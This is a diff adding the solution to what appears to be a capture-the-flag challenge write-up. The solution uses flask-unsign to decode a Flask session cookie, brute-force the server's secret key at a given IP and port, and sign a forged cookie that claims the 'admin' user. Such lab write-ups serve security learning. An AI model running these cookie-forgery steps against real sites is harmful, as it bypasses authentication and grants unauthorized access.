@@ -10,7 +10,15 @@ Good Luck!
 
 #### Solution:
 
+- inspecting the website reveals that it uses `flask` thus we try to forge our custom cookie, with brute-force of the server key
+
 ```bash
+pip3 install flask-unsign
+pip3 install flask-unsign[wordlist]
+
+flask-unsign -d -c 'eyJ1c2VybmFtZSI6bnVsbH0.YWReMQ.jiNtpXvQ8CZtIqXYv0wRmVpKpak'
+flask-unsign --server http://78.128.216.18:65181/ --unsign
+flask-unsign --sign --secret f3cfe9ed8fae309f02079dbf --cookie "{'username': 'admin'}"
 ```
 
 ---
